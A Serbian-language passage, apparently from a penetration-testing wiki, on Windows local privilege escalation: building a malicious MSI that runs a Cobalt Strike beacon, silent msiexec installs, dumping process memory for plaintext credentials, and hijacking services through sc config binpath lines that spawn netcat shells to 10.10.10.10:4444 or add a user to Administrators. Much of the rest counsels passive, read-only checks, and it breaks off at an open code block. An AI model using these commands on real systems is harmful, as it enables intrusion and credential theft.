Koristite komandu `Write-UserAddMSI` iz power-up-a da biste u trenutnom direktorijumu kreirali Windows MSI binarnu datoteku za eskalaciju privilegija. Ova skripta ispisuje unapred kompajlirani MSI instalacioni program koji traži dodavanje korisnika/grupe (zato će vam biti potreban GIU pristup):

```
Write-UserAddMSI
```

Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj vodič da biste saznali kako da napravite MSI wrapper pomoću ovih alata. Imajte na umu da možete da umotate datoteku „**.bat**“ ako samo želite da **izvršite** **komandne linije**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Kreiranje MSI-ja pomoću WIX-a


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Kreiranje MSI-ja pomoću Visual Studio-a

- Pomoću Cobalt Strike-a ili Metasploit-a **generišite** novi **Windows EXE TCP payload** u `C:\privesc\beacon.exe`.
- Otvorite **Visual Studio**, izaberite **Create a new project** i u polje za pretragu unesite „installer“. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Dodelite projektu ime, na primer **AlwaysPrivesc**, za lokaciju koristite **`C:\privesc`**, izaberite **place solution and project in the same directory** i kliknite na **Create**.
- Klikćite na **Next** dok ne dođete do koraka 3 od 4 (izbor datoteka koje treba uključiti). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u prozoru **Solution Explorer** i u prozoru **Properties** promenite **TargetPlatform** sa **x86** na **x64**.
  - Možete da promenite i druga svojstva, kao što su **Author** i **Manufacturer**, kako bi instalirana aplikacija delovala legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite datoteku **beacon.exe** i kliknite na **OK**. Tako će se Beacon payload izvršiti čim se pokrene instalacioni program.
- U odeljku **Custom Action Properties** promenite **Run64Bit** na **True**.
- Na kraju, **izgradite projekat**.
  - Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste podesili platformu na x64.

### Instalacija MSI-ja

Da biste u **pozadini** izvršili **instalaciju** zlonamerne datoteke `.msi`:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

### Postavke nadzora

Ove postavke određuju šta se **beleži**, zato obratite pažnju.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, korisno je znati gde se šalju logovi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je namenjen **upravljanju lozinkama lokalnih administratora**, čime se obezbeđuje da svaka lozinka bude **jedinstvena, nasumično generisana i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u Active Directory-ju, a mogu im pristupiti samo korisnici kojima su putem ACL-ova dodeljene dovoljne dozvole, što im omogućava da vide lozinke lokalnih administratora ako su ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u čistom tekstu čuvaju se u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Počevši od **Windows 8.1**, Microsoft je uveo unapređenu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njenu memoriju** ili ubacuju kod, čime se sistem dodatno štiti.\
[**Više informacija o LSA Protection potražite ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credential Guard

**Credential Guard** је уведен у **Windows 10**. Његова сврха је да заштити акредитиве сачуване на уређају од претњи као што су pass-the-hash напади. [**Више информација о Credential Guard-у доступно је овде.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširani akreditivi

**Akreditive domena** potvrđuje **Local Security Authority** (LSA), a koriste ih komponente operativnog sistema. Kada registrovani bezbednosni paket potvrdi podatke za prijavljivanje korisnika, obično se uspostavljaju akreditivi domena za tog korisnika.\
[**Više informacija o keširanim akreditivima**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i grupe

### Ispis korisnika i grupa

Treba da proverite da li neka od grupa kojima pripadate ima zanimljive dozvole.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda možete da eskalirate privilegije**. Ovde saznajte više o privilegovanim grupama i kako da ih zloupotrebite za eskalaciju privilegija:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali više o zanimljivim tokenima** i kako da ih zloupotrebite:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / sesije

```bash
qwinsta
klist sessions
```

### Korisnički direktorijumi

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinki

```bash
net accounts
```

### Preuzmite sadržaj međuspremnika

```bash
powershell -command "Get-Clipboard"
```

## Pokrenuti procesi

### Dozvole za datoteke i fascikle

Pre svega, prilikom izlistavanja procesa **proverite da li se u komandnoj liniji procesa nalaze lozinke**.\
Proverite možete li da **prepišete neku pokrenutu binarnu datoteku** ili imate dozvole za pisanje u direktorijum u kom se ona nalazi, kako biste iskoristili moguće [**DLL Hijacking napade**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md); mogli biste da ih zloupotrebite za eskalaciju privilegija.

Debugger listener može biti kratkotrajan, pa njegovo odsustvo iz jednog pasivnog snimka portova ne dokazuje da nikada nije bio izložen. Uočeni listener povežite sa njegovim PID-om, vlasnikom procesa i mogućnošću korisnika sa nižim privilegijama da mu pristupi; sam naziv aplikacije ili debug zastavica ne dokazuju izvršavanje koda između korisnika. Rutinsko enumerisanje obavljajte pasivno, bez slanja debugger komandi.

**Provera dozvola za binarne datoteke procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Provera dozvola fascikli binarnih datoteka procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Direktorijumi za Snort dynamic preprocessor

Snort 2 može da učitava deljene biblioteke iz direktorijuma `dynamicpreprocessor directory` navedenog u konfiguraciji izabranoj pomoću `snort.exe -c <config>`. Za zakazani zadatak ili servis koji pokreće Snort pod drugim nalogom, proverite upravo tu konfiguraciju i ACL deklarisanog direktorijuma modula. Ako vaš token može da kreira datoteke u tom direktorijumu, putanja je kandidat za proveru mogućnosti izvršavanja koda pri sledećem učitavanju modula od strane tog zadatka ili servisa. Proverite efektivne privilegije naloga pod kojim se izvršava, aktivnu konfiguraciju, kompatibilnost modula i sva ograničenja deny ili share; sama mogućnost pisanja u direktorijum ne dokazuje eskalaciju. [Snortova dokumentacija za dynamic preprocessor](https://www.snort.org/documents/dpx-readme) opisuje učitavanje modula tokom izvršavanja.

### Privilegovani web servis sa upisivim korenom dokumenta

Na Windows instalaciji Apache-a uporedite putanju izvršne datoteke servisa i nalog pod kojim se izvršava sa vrednošću `DocumentRoot` u aktivnom `httpd.conf`. Za uobičajenu XAMPP postavku proverite `C:\xampp\apache\conf\httpd.conf` i ACL konfigurisane putanje korena dokumenta, često `C:\xampp\htdocs`. Ako korisnik sa nižim privilegijama može da kreira datoteke u tom korenu dok Apache radi kao `LocalSystem`, izvršavanje koda na serveru može da pređe granicu privilegija hosta. Potvrdite da je servis pokrenut, da se poslužuje tačna putanja i da rukovalac na serveru obrađuje tip datoteke; sama mogućnost pisanja u koren dokazuje samo kreiranje datoteka. Proverite ACL-ove bez upisivanja probne datoteke:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Za konvencionalnu WAMP instalaciju, servis može da pokazuje na verzionisani `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ili `C:\wamp\...` za 32-bitni raspored), sa konfiguracijom u susednom direktorijumu `conf\httpd.conf` i podrazumevanim korenom `C:\wamp64\www` ili `C:\wamp\www`. Zajedno proverite tačnu putanju izvršne datoteke servisa, identitet pod kojim se izvršava, efektivni `DocumentRoot` (uključujući razrešavanje `${INSTALL_DIR}` i izmene za virtuelne hostove) i ACL korena. To što je WAMP direktorijum moguće menjati ne znači da se Apache izvršava kao `SYSTEM` niti da će pokrenuti poslatu datoteku. [Apache dokumentuje kako Windows servis bira svoju konfiguraciju](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### IIS koren u koji se može pisati i mrežni identitet pula aplikacija

Za IIS, povežite fizički direktorijum u koji se može pisati sa **aktivnim sajtom/aplikacijom** u `applicationHost.config`, a zatim utvrdite koji su mu pool i server-side handler podešeni. Kod smešten u direktorijumu koji se poslužuje izvršava se kao pool samo ako IIS obrađuje taj tip datoteke i ako je ruta dostupna. Pre nego što direktorijum u koji se može pisati smatrate putem do izvršavanja koda, proverite efektivna prava trenutnog korisnika za kreiranje datoteka, stanje izvršavanja sajta, handler i izmene za konkretnu putanju.

Dinamička kompilacija ASP.NET-a uvodi još jednu putanju koju treba proveriti: generisane datoteke u direktorijumu za kompilaciju aplikacije. Podrazumevana lokacija je direktorijum `Temporary ASP.NET Files` unutar odgovarajuće instalacije .NET Framework-a, ali `<compilation tempDirectory>` aplikacije može da je promeni. [Microsoft dokumentuje lokaciju i poddirektorijume po aplikaciji](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) i [preporučuje izolaciju direktorijuma za kompilaciju kada pulovi aplikacija međusobno ne veruju jedni drugima](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ako token sa nižim privilegijama može da izmeni generisani izvorni kod u kešu **konkretne** aplikacije, utvrdite da li ga ta aplikacija ponovo kompajlira pod privilegovanijim [identitetom worker procesa](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL datoteke ili direktorijuma ne dokazuje izvršavanje koda: proverite povezanost keša sa aktivnom aplikacijom, efektivni token i ACL, podešavanja kompilacije, identitet procesa i vreme eventualne ponovne kompilacije. Oslonite se na pregled metapodataka samo za čitanje; tokom enumeracije nemojte pokretati kompilaciju niti menjati datoteke keša.

IIS pool podešen na `ApplicationPoolIdentity` ili `NetworkService` često se za pristup domenskim resursima autentifikuje kao **nalog računara domaćina**, iako lokalni token može imati niske privilegije. `LocalSystem` već ima visoke lokalne privilegije, a na mreži takođe koristi nalog računara; `LocalService` obično koristi anonimne mrežne akreditive. Pool `SpecificUser` koristi nalog koji je za njega podešen. [Microsoft dokumentuje ove tipove identiteta](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) i [mrežni identitet pula aplikacija](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ako podešavanje identiteta nije navedeno, mogu da važe podrazumevane vrednosti pula, koje se razlikuju među generacijama IIS-a, zato razrešite efektivnu konfiguraciju umesto da nagađate na osnovu naziva pula. Ako izvršavanje koda dosegne pool koji na mreži koristi identitet naloga računara, procenite prava **konkretnog računara** u direktorijumu. [DCSync](../active-directory-methodology/dcsync.md) zahteva prava replikacije nad kontekstom imenovanja domena; tiket naloga računara ili uloga hosta sami po sebi ne dokazuju da ta prava postoje. Pasivna enumeracija treba da pregleda konfiguraciju i ACL-ove bez otpremanja datoteke, uspostavljanja mrežne autentifikacije ili zahtevanja tiketa.

Kod ASP.NET handlera koji može da se čita i pokreće pomoćni proces, pratite svaku vrednost izvedenu iz zahteva kroz autentifikaciju, dešifrovanje, validaciju i sastavljanje komande. Handler koji spaja dekodirani token sa `ProcessStartInfo("cmd", "/c ...")` može omogućiti shell metaznakovima da izmene komandu; [Microsoft dokumentuje specijalne znakove komande `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Utvrdite da li nepouzdan pozivalac zaista može da utiče na dekodiranu vrednost i dosegne handler, pa zatim razrešite efektivni identitet pula aplikacija ili identitet nakon impersonation-a, kao i identitet child procesa. Red izvornog koda koji može da se pročita, listener na localhost-u ili slabost formata tokena sami po sebi ne dokazuju izvršavanje privilegovanih komandi. Pregledajte izvorni kod i konfiguraciju pula bez slanja falsifikovanih zahteva ili pokretanja pomoćnog procesa tokom pasivne enumeracije.

Za PHP servis na Windows-u, putanja kontrolisana zahtevom, prosleđena funkciji [`include` ili `require`](https://www.php.net/manual/en/function.include.php), može da izvrši PHP datoteku koju može da menja korisnik sa nižim privilegijama, pod identitetom worker procesa. Potvrdite da zahtev može da dosegne tu naredbu, da razrešena putanja vodi do datoteke koju korisnik sa nižim privilegijama može da menja i koju worker može da čita, da važeća ograničenja PHP putanja dozvoljavaju uključivanje i da se worker zaista izvršava sa višim privilegijama. Listener na loopback adresi ili datoteka u koju može da se piše sami po sebi ne uspostavljaju ovaj lanac; tokom pasivne enumeracije pregledajte izvorni kod, identitet servisa i ACL-ove datoteka bez pozivanja endpoint-a.

### Pronalaženje lozinki u memoriji

Možete napraviti memory dump procesa koji se izvršava koristeći **procdump** iz sysinternals-a. Servisi kao što je FTP imaju **akreditive u čistom tekstu u memoriji**; pokušajte da napravite memory dump i pročitate akreditive.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nezaštićene GUI aplikacije

**Aplikacije koje rade kao SYSTEM mogu korisniku omogućiti da pokrene CMD ili pregleda direktorijume.**

Primer: „Windows Help and Support“ (Windows + F1), pretražite „command prompt“, kliknite na „Click to open Command Prompt“

### Uvoz projektnih datoteka sa povišenim privilegijama

Aplikacija koja automatski otvara projekte iz direktorijuma za otpremanje u koji korisnik sa nižim privilegijama može da upisuje podatke prelazi granicu poverenja u ulazne podatke pod nalogom uvoznika. Proverite **tačnu putanju sa dozvolom za upis**, proces ili zadatak koji je otvara, efektivni identitet i verziju parsera. [Istorijski problem pri otvaranju/obnavljanju Ghidra projekta](https://github.com/NationalSecurityAgency/ghidra/issues/71) omogućavao je korišćenje spoljašnjih XML entiteta u metapodacima projekta; mrežni entitet u Windowsu mogao je da izazove autentifikaciju naloga koji uvozi projekat ako to dozvoljavaju [politike za odlazni SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To je trag koji može ukazivati na izlaganje akreditiva, a ne na neposredan administratorski pristup: odgovor mora moći da se iskoristi kroz zasebnu ovlašćenu ili ranjivu putanju, a trenutne verzije treba proceniti prema njihovom stvarnom stanju zakrpa. Nemojte otvarati namenski pripremljen projekat tokom pasivne enumeracije; pregledajte tok uvoza i ACL-ove.

## Usluge

Pravo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) na objektu Service Control Manager (SCM) odvojeno je od prava nad postojećom uslugom. Uspešan zahtev za pristup [`OpenSCManager` samo za čitanje](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) sa tim pravom predstavlja osnov za proveru, a ne dokaz da nova usluga može da se pokrene. [`CreateService` vraća handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) sa pravima pristupa usluzi zatraženim pri njenom kreiranju; naknadno ponovno otvaranje usluge podrazumeva zasebnu proveru pristupa i može da ne uspe čak i kada je originalni handle mogao da se koristi. Zasebno proverite efektivni lokalni ili udaljeni token, dodeljena prava handle-a, nalog usluge, politiku pokretanja i putanju izvršne datoteke. Nemojte kreirati niti pokretati uslugu tokom pasivne enumeracije.

Kod udaljene putanje za instalaciju usluge, uporedite ta SCM prava sa deljenim resursom na ciljnom računaru u koji **isto mrežno prijavljivanje** može da upisuje, njegovim osnovnim NTFS ACL-om i lokalnom putanjom do izvršne datoteke koju nalog usluge može da pokrene. Nalog koji nije administratorski može da pređe ovu granicu ako postoje neuobičajeno široka SCM prava i putanja za postavljanje datoteke; administrativni deljeni resurs nije nužan preduslov. Sam pristup za upis u deljeni resurs ili samo mogućnost kreiranja usluge preko SCM-a ne dokazuju da se nova usluga može pokrenuti pod identitetom sa višim privilegijama.

Postojeća usluga može da pozove pomoćnu izvršnu datoteku pri pokretanju, gašenju ili nekom drugom događaju životnog ciklusa, čak i kada te datoteke nema u njenom `ImagePath`. Ako se ime pomoćne datoteke razrešava u direktorijum u koji korisnik sa nižim privilegijama može da upisuje, a usluga radi pod identitetom sa višim privilegijama, nedostajuća pomoćna datoteka može biti kandidat za uslovnu zamenu. Potvrdite **stvarni kod usluge ili dokumentovano pozivanje pomoćne datoteke**, razrešenu putanju izvršne datoteke i redosled pretrage, prava za kreiranje direktorijuma, identitet usluge i dostupni okidač životnog ciklusa. Direktorijum usluge sa dozvolom za upis ili sama nedostajuća datoteka ne dokazuju da će usluga učitati tu datoteku; tokom pasivnog pregleda nemojte pokretati ni zaustavljati uslugu.

Kod postojeće usluge, [`SERVICE_START` dozvoljava prosleđivanje argumenata funkciji `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); to pravo se razlikuje od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Pregledajte kod usluge ili dokumentovani interfejs pre nego što pristup za pokretanje tretirate kao nešto više od prava za upravljanje. Ako koristi argument koji je odredio pozivalac kao putanju za zapisivanje dnevnika ili izvoz, proverite identitet usluge, tačan tok od argumenta do upisa, ograničenja putanje i dozvole za **kreiranu datoteku**. Upis u zaštićeni direktorijum može dovesti do eskalacije samo ako postoji zaseban privilegovani potrošač ili učitavač koji prihvata tu datoteku; sam dnevnik sa dozvolom za upis ili pravo pokretanja nisu dovoljni. Pasivna inventarizacija ne treba da pokreće uslugu niti da kreira testnu datoteku.

Kod agenta za nadzor NSClient++, čitljiva datoteka `nsclient.ini` predstavlja **osnov za proveru konfiguracije**: može da sadrži akreditive za web, dok `boot.ini` može da preusmeri konfiguraciju na drugo mesto. Proverite stvarni nalog usluge, WEB listener i politiku pristupa, kao i to da li autentifikovana uloga može da menja podešavanja ili skripte. Za privilegovano izvršavanje potrebni su i `CheckExternalScripts` (ili druga omogućena putanja za izvršavanje), efektivno pravo za registrovanje ili izmenu komande i okidač koji je pokreće pod identitetom usluge. Listener dostupan samo preko loopback interfejsa i dalje može biti dostupan lokalnom korisniku, ali sama putanja do datoteke, lozinka ili listener ne dokazuju da ta prava postoje. Tokom pasivne enumeracije pregledajte metapodatke i dozvole bez prikazivanja tajni ili pozivanja web API-ja. Pogledajte [raspored datoteka NSClient++](https://nsclient.org/docs/concepts/file-layout/), [smernice za bezbednost web-a i skripti](https://nsclient.org/docs/setup/securing/) i [konfiguraciju spoljašnjih skripti](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kod usluge čiji je `ImagePath` `nssm.exe`, proverite stvarni nalog pod kojim se usluga pokreće i njenu vrednost `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM tamo čuva podređenu aplikaciju](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), dok je `AppDirectory` njen konfigurisani radni direktorijum. Proverite podređenu izvršnu datoteku i ACL-ove nadređenog direktorijuma pre nego što dozvole wrapper-a tretirate kao celu granicu usluge. Lokalna WCF ili SOAP krajnja tačka koju ta podređena aplikacija izlaže predstavlja zaseban osnov za proveru: potvrdite da li je listener dostupan korisniku sa nižim privilegijama, da li konkretna operacija prihvata njegov ulaz i da li podređena usluga izvršava nebezbednu operaciju pod identitetom sa višim privilegijama. Nalog usluge, URL krajnje tačke ili putanja sa dozvolom za upis sami po sebi ne dokazuju eskalaciju; izbegavajte pozivanje operacija usluge tokom pasivne enumeracije.

Kod prilagođene WCF operacije, pratite string kojim upravlja pozivalac do bilo kog PowerShell runspace-a. [`Pipeline.Commands.AddScript` dodaje tekst skripte](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` pokreće pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` sa akreditivima za Windows transport](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) autentifikuje klijenta, ali ovlašćenje za pozivanje te **konkretne** operacije i efektivni identitet runspace-a moraju se proveriti zasebno. Putanja od ulaza pozivaoca sa nižim privilegijama do `AddScript` pod identitetom usluge sa višim privilegijama predstavlja granicu za izvršavanje koda; port koji sluša, autentifikovani klijent ili neiskorišćena metoda u nepovezanom assembly-ju sami po sebi nisu dokaz. Statički pregledajte instaliranu uslugu, ugovor, ovlašćenja i podešavanja impersonacije, bez pozivanja krajnje tačke tokom enumeracije.

Service Triggers omogućavaju Windowsu da pokrene uslugu kada se ispune određeni uslovi (aktivnost imenovane cevi/RPC krajnje tačke, ETW događaji, dostupnost IP-a, priključenje uređaja, osvežavanje GPO-a itd.). Čak i bez prava SERVICE_START često možete pokrenuti privilegovane usluge aktiviranjem njihovih okidača. Tehnike enumeracije i aktivacije pogledajte ovde:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usluga za prikupljanje dijagnostike u Visual Studio

Instalacije Visual Studio-a sa alatima za C/C++ mogu da sadrže `VSStandardCollectorService150`, dijagnostičku uslugu podešenu da radi kao `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) koristio je junction i race uslov sa object-manager-link-om da preusmeri resetovanje DACL-a usluge. Pokazana eskalacija je zahtevala i upotrebljivu putanju za popravku MSI-ja preko Visual Studio Setup WMI Provider-a, kao i ciljnu datoteku `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Komponenta je ispravljena u januaru 2024.

Za pasivnu proveru pregledajte nalog i putanju do binarne datoteke te usluge, proverite da li putanja do Setup WMI kompajlera postoji i utvrdite stanje zakrpa instalirane komponente. Sam unos usluge, verzija proizvoda Visual Studio ili datoteka kompajlera ne dokazuju da je host ranjiv. Pregled ne zahteva pokretanje usluge niti izvršavanje popravke.

Nabavite listu usluga:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu.

```bash
sc qc <service_name>
```

Preporučuje se da imate binarnu datoteku **accesschk** iz _Sysinternals_-a kako biste proverili potreban nivo privilegija za svaku uslugu.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se da proverite da li "Authenticated Users" može da menja neku uslugu:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Možete preuzeti accesschk.exe za XP ovde](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako dobijate ovu grešku (na primer, sa SSDPSRV):

_Greška sistema 1058._\
_Usluga ne može da se pokrene jer je onemogućena ili zato što nema povezanih omogućenih uređaja._

Možete je omogućiti pomoću

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Imajte u vidu da servis upnphost zavisi od SSDPSRV-a da bi radio (za XP SP1)**

**Još jedno zaobilazno rešenje** ovog problema je pokretanje:

```
sc.exe config usosvc start= auto
```

### **Izmena putanje binarne datoteke servisa**

U scenariju u kojem grupa „Authenticated users“ ima dozvolu **SERVICE_ALL_ACCESS** nad servisom, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili i izvršili **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovno pokretanje servisa

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije se mogu eskalirati pomoću različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava rekonfigurisanje binarnog fajla servisa.
- **WRITE_DAC**: Omogućava rekonfigurisanje dozvola, čime se stiče mogućnost izmene konfiguracije servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i rekonfigurisanje dozvola.
- **GENERIC_WRITE**: Omogućava i izmenu konfiguracije servisa.
- **GENERIC_ALL**: Takođe omogućava izmenu konfiguracije servisa.

Za otkrivanje i iskorišćavanje ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole za binarne fajlove servisa

Ako se servis pokreće kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili privilegovani domenski nalog, ali **korisnici sa niskim privilegijama mogu da menjaju EXE fajl servisa ili njegovu nadređenu fasciklu**, servis se često može preoteti **zamenom binarnog fajla i ponovnim pokretanjem servisa**.

**Proverite da li možete da menjate binarni fajl koji pokreće servis** ili da li imate **dozvole za pisanje u fasciklu** u kojoj se binarni fajl nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Možete da dobijete spisak svih binarnih fajlova koje pokreću servisi pomoću **wmic** (nije u system32), a zatim da proverite svoje dozvole pomoću **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Možete koristiti i **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Potražite opasne ACL dozvole dodeljene grupama **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, naročito **`(F)`**, **`(M)`** ili **`(W)`** za izvršnu datoteku servisa ili direktorijum koji je sadrži. Praktičan postupak zloupotrebe je:<sup>[[27]](#references)</sup>

1. Proverite nalog servisa i putanju do izvršne datoteke pomoću `sc qc <service_name>`.
2. Proverite da li je binarna datoteka upisiva pomoću `icacls <path>`.
3. Zamenite binarnu datoteku servisa payload-om ili važećom zlonamernom binarnom datotekom servisa.
4. Ponovo pokrenite servis pomoću `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / okidač servisa).

Korisne automatske provere:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ako servis ne dozvoljava običnom korisniku da ga ponovo pokrene, proverite da li se automatski pokreće pri podizanju sistema, da li ima radnju za slučaj greške koja ga ponovo pokreće ili može posredno da ga pokrene aplikacija koja ga koristi.

### Dozvole za izmenu registra servisa

Trebalo bi da proverite da li možete da izmenite neki registar servisa.\
Možete da **proverite** svoje **dozvole** nad **registrom** servisa tako što ćete:

```bash
